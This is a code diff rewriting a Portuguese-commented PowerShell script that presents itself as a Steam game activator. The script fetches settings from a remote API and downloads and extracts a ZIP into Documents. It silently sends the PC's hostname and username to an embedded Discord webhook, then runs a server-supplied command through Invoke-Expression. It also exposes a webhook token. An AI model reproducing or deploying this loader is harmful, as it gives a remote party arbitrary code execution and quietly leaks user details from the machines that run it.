@@ -1,23 +1,22 @@
-# Configurações Iniciais
+# 1. Configurações Iniciais (Sintaxe PowerShell)
 $API_URL = "https://gaamingsteam.squareweb.app/api/app/"
 $APP_ID = "kastexstorms"
 $ID_JOGO = "2215200"
-WEBHOOK_URL="https://discord.com/api/webhooks/1504479978652303531/mL7S7SbUoOVYplPtqJvQHOX1UeZFxoLSXgPYCvHDkepJbJVu6PSZgjhzGOfxW4yegEq0" 
+$WEBHOOK_URL = "https://discord.com/api/webhooks/1504479978652303531/mL7S7SbUoOVYplPtqJvQHOX1UeZFxoLSXgPYCvHDkepJbJVu6PSZgjhzGOfxW4yegEq0"
 
-HOSTNAME=$(hostname)
-USUARIO=$(whoami)
-DATA=$(date '+%d/%m/%Y %H:%M:%S')
-STATUS="✅ Sucesso"  # ou "❌ Falhou" dependendo do resultado
+$HOSTNAME_PC = hostname
+$USUARIO = whoami
+$DATA = Get-Date -Format "dd/MM/yyyy HH:mm:ss"
+$STATUS = "✅ Sucesso"
 
-
-# Funções de Mensagem (Equivalente ao ctypes.windll.user32.MessageBoxW)
+# Função de Mensagem
 function Show-MessageBox {
     param([string]$Message, [string]$Title)
     Add-Type -AssemblyName PresentationFramework
     [System.Windows.MessageBox]::Show($Message, $Title)
 }
 
-# 1. Buscar Configurações da API
+# 2. Buscar Configurações da API
 $UrlFinal = "$API_URL$APP_ID/$ID_JOGO"
 try {
     $response = Invoke-RestMethod -Uri $UrlFinal -Method Get -TimeoutSec 10
@@ -31,22 +30,22 @@ if (-not $response.ativo) {
     exit
 }
 
-# 2. Detectar Caminhos
+# 3. Detectar e Criar Pastas
 $DocumentsPath = [System.IO.Path]::Combine([Environment]::GetFolderPath("MyDocuments"), "conteudo")
 if (-not (Test-Path $DocumentsPath)) {
     New-Item -ItemType Directory -Path $DocumentsPath | Out-Null
 }
 
-# 3. Baixar o arquivo ZIP
+# 4. Baixar o arquivo ZIP
 $ZipDestino = Join-Path $DocumentsPath "$ID_JOGO.zip"
 try {
     Invoke-WebRequest -Uri $response.url_zip -OutFile $ZipDestino
 } catch {
+    $STATUS = "❌ Falhou no Download"
     Write-Error "Falha ao baixar o arquivo ZIP."
-    exit
 }
 
-# 4. Processar e Extrair o ZIP (Ativar Jogo)
+# 5. Processar e Extrair o ZIP
 $reiniciar = $false
 if (Test-Path $ZipDestino) {
     Add-Type -AssemblyName System.IO.Compression.FileSystem
@@ -70,30 +69,30 @@ if (Test-Path $ZipDestino) {
         }
     }
     $zip.Dispose()
+    Remove-Item $ZipDestino -Force
 }
 
-PAYLOAD=$(cat <<EOF
-{
-  "embeds": [{
-    "title": "📊 Relatório de Execução",
-    "color": 3066993,
-    "fields": [
-      {"name": "🎮 ID do Jogo", "value": "$ID_JOGO", "inline": true},
-      {"name": "💻 PC", "value": "$HOSTNAME", "inline": true},
-      {"name": "👤 Usuário", "value": "$USUARIO", "inline": true},
-      {"name": "📅 Data/Hora", "value": "$DATA", "inline": true},
-      {"name": "Status", "value": "$STATUS", "inline": false}
-    ]
-  }]
+# 6. Enviar Relatório para o Discord (Substituindo CURL e CAT)
+$Payload = @{
+    embeds = @(@{
+        title = "📊 Relatório de Execução"
+        color = 3066993
+        fields = @(
+            @{ name = "🎮 ID do Jogo"; value = $ID_JOGO; inline = $true }
+            @{ name = "💻 PC"; value = $HOSTNAME_PC; inline = $true }
+            @{ name = "👤 Usuário"; value = $USUARIO; inline = $true }
+            @{ name = "📅 Data/Hora"; value = $DATA; inline = $true }
+            @{ name = "Status"; value = $STATUS; inline = $false }
+        )
+    })
 }
-EOF
-)
 
-curl -s -X POST "$WEBHOOK_URL" \
-  -H "Content-Type: application/json" \
-  -d "$PAYLOAD"
+$Json = $Payload | ConvertTo-Json -Depth 4
+try {
+    Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $Json -ContentType "application/json"
+} catch {}
 
-# 5. Executar Comando Steam Update e Finalizar
+# 7. Executar Comando Steam Update e Finalizar
 if ($reiniciar -and $response.comando_powershell) {
     Invoke-Expression $response.comando_powershell
 }
